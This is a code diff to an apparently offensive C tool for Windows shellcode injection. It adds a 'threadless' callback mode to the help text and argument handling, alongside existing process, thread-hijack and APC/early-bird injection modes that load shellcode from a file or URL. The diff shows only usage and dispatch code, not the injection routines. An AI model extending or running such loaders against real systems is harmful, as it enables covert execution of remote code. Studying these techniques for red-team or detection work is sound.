@@ -10,6 +10,8 @@ int PrintHelp(char* argv0, char* function)
 		printf("[!] Usage: %s %s <local/remote> [ProcessName] [ThreadEnumerationMethod] <file/URL shellcode>\n", argv0, function);
 	else if (strcmp(function, "apc") == 0)
 		printf("[!] Usage: %s %s <local/remote/hijack/earlybird> [ProcessName] [EarlyBirdMethod] [alertable/suspended [AlertableFunction]] <file/URL shellcode>\n", argv0, function);
+	else if (strcmp(function, "threadless") == 0)
+		printf("[!] Usage: %s %s <callback> <file/URL shellcode>\n", argv0, function);
 	else
 	{
 		printf("[!] Usage: %s <Function> <arguments>\n", argv0);
@@ -17,6 +19,7 @@ int PrintHelp(char* argv0, char* function)
 		printf("\t1.>>> \"process\"\t\t\t\t::: Process Injection\n");
 		printf("\t2.>>> \"thread\"\t\t\t\t::: Thread Hijacking\n");
 		printf("\t3.>>> \"apc\"\t\t\t\t::: Apc Injection\n");
+		printf("\t4.>>> \"threadless\"\t\t\t\t::: Threadless Injection\n");
 	}
 
 	if (strcmp(function, "process") == 0)
@@ -40,6 +43,7 @@ int PrintHelp(char* argv0, char* function)
 		printf("\t3.>>> \"waitformultipleobjectsex\"\t::: Using WaitForMultipleObjectsEx NativeAPI\n");
 		printf("\t4.>>> \"msgwaitformultipleobjectsex\"\t::: Using MsgWaitForMultipleObjectsEx NativeAPI\n");
 		printf("\t5.>>> \"signalobjectandwait\"\t\t::: Using SignalObjectAndWait NativeAPI\n");
+
 		printf("\n[i] [EarlyBirdMethod] Can Be : \n");
 		printf("\t1.>>> \"suspended\"\t\t\t\t::: Using CREATE_SUSPENDED process creation flag\n");
 		printf("\t2.>>> \"debug\"\t\t::: Using DEBUG_PROCESS process creation flag\n");
@@ -202,6 +206,21 @@ int main(int argc, char *argv[])
 			else
 				printf("[i] Performing local APC injection with suspended thread!\n");
 			ApcInjection(bAlertable, dwAlertableFunction, NULL, argv[argc - 1]);
+		}
+	}
+
+	// Injections.exe threadless <callback> <file/URL shellcode>
+	else if (argc == 4 && strcmp(argv[1], "threadless") == 0)
+	{
+		if (strcmp(argv[2], "callback") == 0)
+		{
+			printf("[i] Performing threadless execution using a callback function!\n");
+			CallbackFunction(argv[argc - 1]);
+		}
+		else
+		{
+			printf("[!] Invalid threadless method!\n");
+			return PrintHelp(argv[0], argv[1]);
 		}
 	}
 
